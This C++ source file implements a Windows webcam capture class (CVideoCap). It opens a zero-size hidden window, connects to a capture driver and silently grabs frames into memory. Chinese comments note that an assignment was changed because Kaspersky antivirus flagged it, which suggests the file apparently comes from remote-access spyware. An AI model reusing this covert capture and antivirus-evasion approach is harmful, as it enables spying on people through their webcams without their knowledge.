// VideoCap.cpp: implementation of the CVideoCap class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "VideoCap.h"
#include <tchar.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool CVideoCap::m_bIsConnected = false;

CVideoCap::CVideoCap()
{
	m_bIsCapture = false;
	m_lpbmi = NULL;
	m_lpDIB = NULL;

	if (!IsWebCam() || m_bIsConnected)
		return;
	m_hWnd = CreateWindow(_T("#32770"), _T(""), WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	m_hWndCap = capCreateCaptureWindow
		(
		_T("CVideoCap"), 
		WS_CHILD | WS_VISIBLE,
		0,
		0,
		0,
		0,
		m_hWnd,
		0
		);
}

CVideoCap::~CVideoCap()
{
	if (m_bIsConnected)
	{
		capCaptureAbort(m_hWndCap);
		capSetCallbackOnError(m_hWndCap, NULL);
		capSetCallbackOnFrame(m_hWndCap, NULL);
		capDriverDisconnect(m_hWndCap);

		if (m_lpbmi)
			delete []m_lpbmi;
		if (m_lpDIB)
			delete []m_lpDIB;
		m_bIsConnected = false;
	}

	CloseWindow(m_hWnd);
	CloseWindow(m_hWndCap);
}
// 自定义错误
LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCTSTR lpsz)
{
	return -1;
}

LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	try
	{
		CVideoCap *pThis = (CVideoCap *)capGetUserData(hWnd);
		if (pThis != NULL)
		{
			memcpy(pThis->m_lpDIB, lpVHdr->lpData, pThis->m_lpbmi->bmiHeader.biSizeImage);
			InterlockedExchange((LPLONG)&(pThis->m_bIsCapture), false);//被卡巴杀掉了
//			pThis->m_bIsCapture = false;
		}
	}catch(...){};

	return 0;
}

BOOL CVideoCap::IsWebCam()
{
	// 已经连接了
	if (m_bIsConnected)
		return FALSE;

	BOOL  bRet = FALSE;
	
	TCHAR lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

LPVOID CVideoCap::GetDIB()
{
	InterlockedExchange((LPLONG)&(m_bIsCapture), true);
//	m_bIsCapture = true;//被卡巴杀掉了
	capGrabFrameNoStop(m_hWndCap);
	while (m_bIsCapture == true)
		Sleep(100);

	return m_lpDIB;
}

bool CVideoCap::Initialize()
{
	CAPDRIVERCAPS	gCapDriverCaps;
	DWORD			dwSize;

	if (!IsWebCam())
		return false;
	// 将捕获窗同驱动器连接
	int i = 0;
	for (i = 0; i < 10; i++)
	{
		if (capDriverConnect(m_hWndCap, i))
			break;
	}
	if (i == 10)
		return false;
	
	
	dwSize = capGetVideoFormatSize(m_hWndCap);
	capSetUserData(m_hWndCap, this);

	capSetCallbackOnError(m_hWndCap, capErrorCallback);
	if (!capSetCallbackOnFrame(m_hWndCap, FrameCallbackProc))
	{
		return false;
	}
	m_lpbmi = (BITMAPINFO *) new BYTE[dwSize];
	
	capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
	m_lpDIB = (LPVOID) new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	capDriverGetCaps(m_hWndCap, &gCapDriverCaps, sizeof(CAPDRIVERCAPS));
	

	capOverlay(m_hWndCap, FALSE);
	capPreview(m_hWndCap, TRUE); // 选择preview方式占用固定的cpu时间	
	capPreviewScale(m_hWndCap, FALSE);

	m_bIsConnected = true;

	return true;
}
